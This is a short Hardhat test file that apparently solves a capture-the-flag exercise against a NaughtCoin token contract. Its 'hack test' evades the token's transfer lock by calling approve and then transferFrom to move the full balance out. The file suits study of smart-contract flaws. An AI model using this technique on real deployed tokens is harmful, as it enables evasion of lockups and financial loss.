const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("test", function () {
    var NaughtCoin;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const NaughtCoinInstance = await ethers.getContractFactory("NaughtCoin");
        NaughtCoin = await NaughtCoinInstance.deploy(deployer.address);
    });
    it("hack test", async function () {
        expect(await NaughtCoin.balanceOf(deployer.address)).to.equal("1000000000000000000000000");
        await NaughtCoin.approve(deployer.address, MaxUint256);
        await NaughtCoin.transferFrom(deployer.address, users[0].address, "1000000000000000000000000");
        expect(await NaughtCoin.balanceOf(deployer.address)).to.equal("0");
    });
});
